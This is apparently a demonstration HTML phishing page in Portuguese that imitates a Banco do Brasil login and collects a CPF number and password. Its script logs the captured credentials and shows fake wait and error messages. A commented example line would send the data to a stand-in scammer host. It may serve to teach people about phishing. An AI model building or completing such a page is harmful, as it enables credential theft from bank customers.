<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banco Falso - Tela Fake</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 300px;
    }
    h2 {
      text-align: center;
      color: #0047AB;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0047AB;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .mensagem {
      margin-top: 10px;
      text-align: center;
      color: green;
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Banco do Brasil</h2>
    <form id="formFake">
      <label>CPF:</label>
      <input type="text" id="cpf" placeholder="000.000.000-00" required />
      <label>Senha:</label>
      <input type="password" id="senha" placeholder="••••••••" required />
      <button type="submit">Entrar</button>
    </form>
    <div class="mensagem" id="mensagem"></div>
  </div>

  <script>
    const form = document.getElementById("formFake");
    const msg = document.getElementById("mensagem");

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      const cpf = document.getElementById("cpf").value;
      const senha = document.getElementById("senha").value;

      // Aqui o dado seria enviado para um banco real do golpista
      // Exemplo: fetch("https://api-do-golpista.com/capturar", { ... })

      console.log("Capturado: ", cpf, senha); // Simulando roubo
      msg.style.display = "block";
      msg.innerText = "Aguarde... Verificando seus dados.";

      // Simulando tempo de "login falso"
      setTimeout(() => {
        msg.innerText = "Erro: sistema indisponível no momento.";
      }, 2000);
    });
  </script>
</body>
</html>
